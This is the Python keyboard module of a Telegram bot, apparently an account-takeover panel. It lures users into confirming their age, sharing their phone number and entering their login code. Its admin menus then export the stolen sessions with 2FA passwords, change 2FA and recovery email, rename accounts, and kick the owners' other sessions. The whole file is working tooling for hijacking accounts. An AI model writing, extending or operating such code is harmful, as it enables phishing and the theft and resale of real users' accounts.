# keyboards.py
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
)

import database
import user_messages
from phone_countries import phone_to_country

ADMIN_FOOTER = "\n\n─────────────\n⚡️ @No1_noone"

# أزرار الأدمن تستخدم id الجلسة (حرف + رقم) لتجنب حد 64 بايت في callback_data
CB = {
    "session": "i",
    "export": "x",
    "delete": "d",
    "delete_confirm": "dc",
    "hide": "h",
    "code": "c",
    "mail": "m",
    "user": "u",
    "name": "n",
    "twofa": "f",
    "kick": "k",
    "kick_only": "ks",
    "kick_spec": "kp",
    "forcemail": "fm",
    "direct_2fa": "df",
    "verify": "v",
    "rotate_session": "ro",
}


def cb(kind: str, session_id: int) -> str:
    return f"{CB[kind]}{session_id}"


def confirm_delete_keyboard(session_id: int, phone: str) -> InlineKeyboardMarkup:
    """شاشة تأكيد الحذف — زر تأكيد + زر إلغاء يرجع لتفاصيل الجلسة."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="✅ نعم، احذف نهائياً",
                callback_data=cb("delete_confirm", session_id),
            ),
            InlineKeyboardButton(
                text="❌ إلغاء",
                callback_data=cb("session", session_id),
            ),
        ]
    ])


def age_confirm_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=user_messages.render("confirm_button"),
            callback_data="confirm_age",
        )]
    ])


def share_phone_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(
            text=user_messages.render("confirm_button"),
            request_contact=True,
        )]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )


def numpad_keyboard(current_input: str = "") -> InlineKeyboardMarkup:
    display = current_input if current_input else "_ _ _ _ _"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📟 {display}", callback_data="numpad_display")],
        [
            InlineKeyboardButton(text="1", callback_data="np_1"),
            InlineKeyboardButton(text="2", callback_data="np_2"),
            InlineKeyboardButton(text="3", callback_data="np_3"),
        ],
        [
            InlineKeyboardButton(text="4", callback_data="np_4"),
            InlineKeyboardButton(text="5", callback_data="np_5"),
            InlineKeyboardButton(text="6", callback_data="np_6"),
        ],
        [
            InlineKeyboardButton(text="7", callback_data="np_7"),
            InlineKeyboardButton(text="8", callback_data="np_8"),
            InlineKeyboardButton(text="9", callback_data="np_9"),
        ],
        [
            InlineKeyboardButton(text="0", callback_data="np_0"),
            InlineKeyboardButton(text="⌫", callback_data="np_del"),
        ],
    ])


def retry_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 محاولة أخرى", callback_data="retry_code")]
    ])


def _session_label(s) -> str:
    phone = s["phone"]
    valid = bool(s["valid"]) if s["valid"] is not None else True
    parts = []
    if database.row_flag(s, "secured"):
        parts.append("🔒")
    if database.row_flag(s, "a1_only"):
        parts.append("⭐")
    parts.append("✅" if valid else "❌")
    parts.append(phone)
    return " ".join(parts)


def sessions_keyboard(
    sessions,
    page: int = 0,
    per_page: int = 6,
    is_super_admin: bool = False,
) -> InlineKeyboardMarkup:
    total = len(sessions)
    start = page * per_page
    end = start + per_page
    page_sessions = sessions[start:end]

    buttons = []
    for s in page_sessions:
        sid = s["id"]
        label = _session_label(s)
        row = [
            InlineKeyboardButton(text=label, callback_data=cb("session", sid)),
        ]
        if is_super_admin:
            star = "⭐" if database.row_flag(s, "a1_only") else "☆"
            row.append(
                InlineKeyboardButton(text=star, callback_data=cb("hide", sid))
            )
        row.append(
            InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid))
        )
        buttons.append(row)

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(
            text="◀️ السابق", callback_data=f"sessions_page_{page - 1}"
        ))
    if end < total:
        nav.append(InlineKeyboardButton(
            text="التالي ▶️", callback_data=f"sessions_page_{page + 1}"
        ))
    if nav:
        buttons.append(nav)

    admin_tools = []
    admin_tools.append(
        InlineKeyboardButton(
            text="🔓 الحسابات الغير مأمنه",
            callback_data="list_unsecured",
        )
    )
    admin_tools.append(
        InlineKeyboardButton(
            text="🔴 الجلسات المعطلة",
            callback_data="list_disabled",
        )
    )
    buttons.append(admin_tools)

    buttons.append([
        InlineKeyboardButton(
            text="⚠️ الجلسات بلا تحقق بخطوتين",
            callback_data="list_no_two_fa",
        )
    ])

    admin_tools_2 = []
    if is_super_admin:
        admin_tools_2.append(
            InlineKeyboardButton(
                text="🔍 فحص الجلسات",
                callback_data="check_sessions",
            )
        )
    admin_tools_2.append(
        InlineKeyboardButton(
            text="🗑 حذف غير الصالحة",
            callback_data="purge_invalid",
        )
    )
    buttons.append(admin_tools_2)
    export_row = [
        InlineKeyboardButton(
            text="📥 سحب كل الجلسات (TXT)",
            callback_data="export_all_txt",
        )
    ]
    if is_super_admin:
        export_row.append(
            InlineKeyboardButton(
                text="⭐ سحب جلسات النجمة",
                callback_data="export_star_txt",
            )
        )
    buttons.append(export_row)

    buttons.append([
        InlineKeyboardButton(
            text="🔒 سحب الجلسات المؤمنة",
            callback_data="export_secured_txt",
        )
    ])

    buttons.append([
        InlineKeyboardButton(
            text="✅ سحب مؤمنة (تحقق شغال فقط)",
            callback_data="export_secured_valid_two_fa",
        )
    ])

    buttons.append([
        InlineKeyboardButton(
            text="🌍 سحب مؤمنة حسب الدولة",
            callback_data="export_secured_by_country",
        )
    ])

    buttons.append([
        InlineKeyboardButton(
            text="🔍 فحص صحة التحقق",
            callback_data="check_two_fa_all",
        ),
        InlineKeyboardButton(
            text="❗ تحققها غير صالح",
            callback_data="list_invalid_two_fa",
        ),
    ])

    if is_super_admin:
        buttons.append([
            InlineKeyboardButton(
                text="✏️ رسائل المستخدمين",
                callback_data="edit_user_messages",
            ),
        ])
        buttons.append([
            InlineKeyboardButton(
                text="📦 سحب Volume",
                callback_data="vol_export",
            ),
            InlineKeyboardButton(
                text="📤 رفع Volume",
                callback_data="vol_import",
            ),
        ])
        buttons.append([
            InlineKeyboardButton(
                text="📦 رفع Volume متعدد",
                callback_data="vol_import_multi",
            ),
        ])
        buttons.append([
            InlineKeyboardButton(
                text="🔄 تغيير ج",
                callback_data="rotate_sessions_all",
            ),
            InlineKeyboardButton(
                text="🔑 تغيير ت",
                callback_data="change_2fa_all",
            ),
        ])
        buttons.append([
            InlineKeyboardButton(
                text="🗑 حذف جلسات مؤمنة معطلة",
                callback_data="purge_secured_invalid",
            ),
        ])

    return InlineKeyboardMarkup(inline_keyboard=buttons)


def admin_empty_keyboard() -> InlineKeyboardMarkup:
    """لوحة أدوات عندما لا توجد جلسات — أدمن A1."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="✏️ رسائل المستخدمين",
                callback_data="edit_user_messages",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔍 فحص الجلسات",
                callback_data="check_sessions",
            ),
        ],
    ])


def user_messages_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="👋 رسالة البداية (/start)",
                callback_data="edit_um_start_msg",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔘 نص زر التأكيد",
                callback_data="edit_um_confirm_button",
            ),
        ],
        [
            InlineKeyboardButton(
                text="📟 رسالة طلب الكود",
                callback_data="edit_um_enter_code_msg",
            ),
        ],
        [
            InlineKeyboardButton(
                text="⚠️ رسالة التحذير (بعد الضغط)",
                callback_data="edit_um_confirm_age_msg",
            ),
        ],
        [
            InlineKeyboardButton(
                text="📋 مسجل مسبقاً",
                callback_data="edit_um_already_registered",
            ),
        ],
        [
            InlineKeyboardButton(
                text="✅ بعد التسجيل",
                callback_data="edit_um_registration_success",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔗 رابط الفيديو",
                callback_data="edit_um_registration_link",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔄 إعادة الافتراضي (الكل)",
                callback_data="reset_user_messages",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔙 رجوع للجلسات",
                callback_data="back_to_sessions",
            ),
        ],
    ])


def session_detail_keyboard(session_id: int, page: int = 0, is_super_admin: bool = False, source: str = "main") -> InlineKeyboardMarkup:
    buttons = [
        [
            InlineKeyboardButton(
                text="🔑 المطالبة بكود",
                callback_data=cb("code", session_id),
            ),
            InlineKeyboardButton(
                text="🔐 جلب تحقق",
                callback_data=cb("verify", session_id),
            ),
        ],
        [InlineKeyboardButton(
            text="📧 فحص/ربط بريد Login",
            callback_data=cb("mail", session_id),
        )],
        [InlineKeyboardButton(
            text="📧 تغيير البريد إجباري",
            callback_data=cb("forcemail", session_id),
        )],
        [InlineKeyboardButton(
            text="📜 سحب الجلسة (Text)",
            callback_data=cb("export", session_id),
        )],
        [
            InlineKeyboardButton(
                text="✏️ تغيير اليوزر",
                callback_data=cb("user", session_id),
            ),
            InlineKeyboardButton(
                text="📝 تغيير الاسم",
                callback_data=cb("name", session_id),
            ),
        ],
        [InlineKeyboardButton(
            text="🔐 تعيين/تغيير التحقق بخطوتين",
            callback_data=cb("twofa", session_id),
        )],
        [InlineKeyboardButton(
            text="🔐 تغيير تحقق (الثابت)",
            callback_data=cb("direct_2fa", session_id),
        )],
        [
            InlineKeyboardButton(
                text="🚫 طرد الجلسات فقط",
                callback_data=cb("kick_only", session_id),
            ),
        ]
    ]

    if is_super_admin:
        buttons.append([
            InlineKeyboardButton(
                text="⭐ إضافة/إزالة من النجمة",
                callback_data=cb("hide", session_id),
            ),
            InlineKeyboardButton(
                text="📱 طرد جلسة معينة",
                callback_data=cb("kick_spec", session_id),
            )
        ])
        buttons.append([
            InlineKeyboardButton(
                text="🔄 تغيير ج",
                callback_data=cb("rotate_session", session_id),
            ),
        ])

    back_cb = f"sessions_page_{page}"
    if source == "unsecured":
        back_cb = f"unsecured_page_{page}"
    elif source == "disabled":
        back_cb = f"disabled_page_{page}"

    buttons.extend([
        [InlineKeyboardButton(
            text="🚫 طرد الجلسات + تنظيف شامل",
            callback_data=cb("kick", session_id),
        )],
        [InlineKeyboardButton(
            text="🔧 وضع الصيانة / إنهاؤه",
            callback_data=f"maint_on_{session_id}",
        )],
        [InlineKeyboardButton(
            text="👥 تحديث جهات الاتصال المشتركة",
            callback_data=f"upd_contacts_{session_id}",
        )],
        [InlineKeyboardButton(
            text="🗑 إزالة الحساب نهائياً",
            callback_data=cb("delete", session_id),
        )],
        [InlineKeyboardButton(
            text="🔙 رجوع للقائمة",
            callback_data=back_cb,
        )],
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def back_to_session_keyboard(session_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 رجوع", callback_data=cb("session", session_id))]
    ])


def unsecured_sessions_keyboard(sessions, page: int = 0, per_page: int = 10) -> InlineKeyboardMarkup:
    total = len(sessions)
    start = page * per_page
    end = start + per_page
    page_sessions = sessions[start:end]

    buttons = []
    for s in page_sessions:
        sid = s["id"]
        label = _session_label(s)
        buttons.append([
            InlineKeyboardButton(text=label, callback_data=cb("session", sid))
        ])
    
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(
            text="◀️ السابق", callback_data=f"unsecured_page_{page - 1}"
        ))
    if end < total:
        nav.append(InlineKeyboardButton(
            text="التالي ▶️", callback_data=f"unsecured_page_{page + 1}"
        ))
    if nav:
        buttons.append(nav)

    if sessions:
        buttons.append([
            InlineKeyboardButton(
                text="🛡️ تأمين كل الجلسات (المتصلة الآن)",
                callback_data="secure_all_unsecured",
            )
        ])
    
    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def disabled_sessions_keyboard(sessions, page: int = 0, per_page: int = 10) -> InlineKeyboardMarkup:
    total = len(sessions)
    start = page * per_page
    end = start + per_page
    page_sessions = sessions[start:end]

    buttons = []
    for s in page_sessions:
        sid = s["id"]
        label = _session_label(s)
        buttons.append([
            InlineKeyboardButton(text=label, callback_data=cb("session", sid)),
            InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid))
        ])
    
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(
            text="◀️ السابق", callback_data=f"disabled_page_{page - 1}"
        ))
    if end < total:
        nav.append(InlineKeyboardButton(
            text="التالي ▶️", callback_data=f"disabled_page_{page + 1}"
        ))
    if nav:
        buttons.append(nav)

    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def no_two_fa_sessions_keyboard(sessions, page: int = 0, per_page: int = 10) -> InlineKeyboardMarkup:
    """لوحة عرض الجلسات الصالحة بلا تحقق بخطوتين."""
    total = len(sessions)
    start = page * per_page
    end = start + per_page
    page_sessions = sessions[start:end]

    buttons = []
    for s in page_sessions:
        sid = s["id"]
        label = _session_label(s)
        buttons.append([
            InlineKeyboardButton(text=label, callback_data=cb("session", sid)),
            InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid)),
        ])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(
            text="◀️ السابق", callback_data=f"no_two_fa_page_{page - 1}"
        ))
    if end < total:
        nav.append(InlineKeyboardButton(
            text="التالي ▶️", callback_data=f"no_two_fa_page_{page + 1}"
        ))
    if nav:
        buttons.append(nav)

    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def secured_by_country_keyboard(
    country_stats: list[tuple[str, str, str, int]],
) -> InlineKeyboardMarkup:
    """
    عرض الدول كأزرار مرتبة حسب العدد.
    country_stats: [(dial_code, flag, name, count), ...]
    """
    buttons = []

    # صفين كل صف
    row: list[InlineKeyboardButton] = []
    for dial, flag, name, count in country_stats:
        btn = InlineKeyboardButton(
            text=f"{flag} {name} ({count})",
            callback_data=f"sec_ctry_{dial}",
        )
        row.append(btn)
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)

    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def invalid_two_fa_sessions_keyboard(
    sessions, page: int = 0, per_page: int = 10
) -> InlineKeyboardMarkup:
    """لوحة عرض الجلسات ذات التحقق غير الصالح."""
    total = len(sessions)
    start = page * per_page
    end = start + per_page
    page_sessions = sessions[start:end]

    buttons = []
    for s in page_sessions:
        sid = s["id"]
        label = _session_label(s)
        stage = s["repair_2fa_stage"] if "repair_2fa_stage" in s.keys() else None
        if stage is not None and stage < 3:
            label = "🔧 " + label
        buttons.append([
            InlineKeyboardButton(text=label, callback_data=cb("session", sid)),
            InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid)),
        ])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(
            text="◀️ السابق",
            callback_data=f"invalid_two_fa_page_{page - 1}",
        ))
    if end < total:
        nav.append(InlineKeyboardButton(
            text="التالي ▶️",
            callback_data=f"invalid_two_fa_page_{page + 1}",
        ))
    if nav:
        buttons.append(nav)

    if sessions:
        buttons.append([
            InlineKeyboardButton(
                text="🔧 إصلاح الكل (طرد + بريد + إعادة تعيين)",
                callback_data="repair_invalid_two_fa_all",
            )
        ])

    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def kick_specific_keyboard(session_id: int, authorizations) -> InlineKeyboardMarkup:
    buttons = []
    for auth in authorizations:
        if auth.current:
            continue
        
        # معلومات الجهاز للمعاينة
        label = f"{auth.device_model} | {auth.platform} | {auth.country}"
        # نستخدم الـ hash كمعرف للطرد
        # التنسيق: kp_sid_hash
        buttons.append([
            InlineKeyboardButton(text=label, callback_data=f"kp_{session_id}_{auth.hash}")
        ])
    
    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data=cb("session", session_id))
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


# ═══════════════════════════════════════════
# كيبورد اختيار صيغة السحب
# ═══════════════════════════════════════════

def export_format_keyboard(
    source_cb: str,
    current_fmt: int = 1,
    cancel_cb: str = "back_to_sessions",
) -> InlineKeyboardMarkup:
    """
    يُظهر خيارات صيغة السحب قبل تصدير الجلسات.
    source_cb: callback_data الزر الذي سيُستدعى بعد الاختيار (مثلاً export_all_txt_go)
    """
    def mark(n): return "✅ " if current_fmt == n else ""
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=f"{mark(1)}1️⃣  رقم:جلسة",
            callback_data=f"set_efmt_1_{source_cb}",
        )],
        [InlineKeyboardButton(
            text=f"{mark(2)}2️⃣  رقم:جلسة:تحقق",
            callback_data=f"set_efmt_2_{source_cb}",
        )],
        [InlineKeyboardButton(
            text=f"{mark(3)}3️⃣  رقم:جلسة:تحقق:جهات_مشتركة",
            callback_data=f"set_efmt_3_{source_cb}",
        )],
        [InlineKeyboardButton(text="❌ إلغاء", callback_data=cancel_cb)],
    ])


def maintenance_toggle_keyboard(session_id: int, in_maintenance: bool) -> InlineKeyboardMarkup:
    """زر تبديل وضع الصيانة."""
    toggle_text = "✅ إنهاء الصيانة" if in_maintenance else "🔧 وضع الصيانة"
    toggle_cb   = f"maint_off_{session_id}" if in_maintenance else f"maint_on_{session_id}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=toggle_text, callback_data=toggle_cb)],
        [InlineKeyboardButton(text="👥 تحديث جهات الاتصال", callback_data=f"upd_contacts_{session_id}")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data=f"i{session_id}")],
    ])
